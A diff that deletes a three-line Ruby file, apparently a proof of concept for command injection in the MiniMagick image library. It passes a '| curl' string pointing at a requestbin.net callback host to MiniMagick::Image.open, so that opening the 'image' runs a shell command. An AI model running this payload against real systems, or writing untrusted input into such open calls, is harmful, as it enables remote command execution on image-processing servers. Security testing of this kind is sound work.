@@ -1,3 +1,0 @@
-require "mini_magick"
-
-image = MiniMagick::Image.open("| curl https://xskc3xhz9q08j6t1.b.requestbin.net", ext="dummy")
